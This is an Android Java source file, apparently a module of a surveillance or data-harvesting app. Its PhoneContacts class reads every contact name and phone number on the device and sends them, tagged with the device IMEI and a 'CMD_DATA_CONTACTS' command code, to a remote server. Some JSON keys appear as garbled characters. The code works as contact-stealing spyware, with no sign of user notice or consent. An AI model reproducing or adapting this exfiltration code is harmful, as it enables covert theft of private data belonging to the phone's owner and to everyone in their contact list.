package com.phone.data;


import com.authority.AuthoritySettings;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.WriteDateFile;
import org.json.JSONArray;
import org.json.JSONObject;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;


public class PhoneContacts implements Runnable{
	private static final String TAG = "PhoneContacts";
	private Context context;
	
	
	public PhoneContacts(Context context){
		this.context = context;
	}
	
	public void run(){
		String contacts = getUserContacts(context);
		if(contacts != null && contacts.equals("") == false){
			SendDataToServer.sendDataToServer(contacts.getBytes(), contacts.getBytes().length, 
					Public.CMD_DATA_CONTACTS, Public.IMEI);
		}
	}
	
	@TargetApi(Build.VERSION_CODES.ECLAIR)  
	public static String getUserContacts(Context context) {
		Log.e(TAG,"getUserContacts");
		
		JSONArray jsarray=new JSONArray();
		
		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_CONTACTS) == false){
			return jsarray.toString();
		}

		try{
			ContentResolver resolver = context.getContentResolver();
	        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
	        Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,cols, null, null, null);
	        if(cursor != null && cursor.getCount() > 0){
		        int j = 0;
		        for (int i = 0; i < cursor.getCount(); i++) {
		            cursor.moveToPosition(i);
		            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
		            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
		            String name = cursor.getString(nameFieldColumnIndex);
		            String number = cursor.getString(numberFieldColumnIndex);

		            JSONObject jsobj = new JSONObject();
		            jsobj.put("³Æºô", name);
		            jsobj.put("ºÅÂë", number);
		            jsarray.put(j,jsobj);
		            j ++;
		        }
		        cursor.close();
	        }
		}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("UserContacts exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
				
		return jsarray.toString();
	}
}
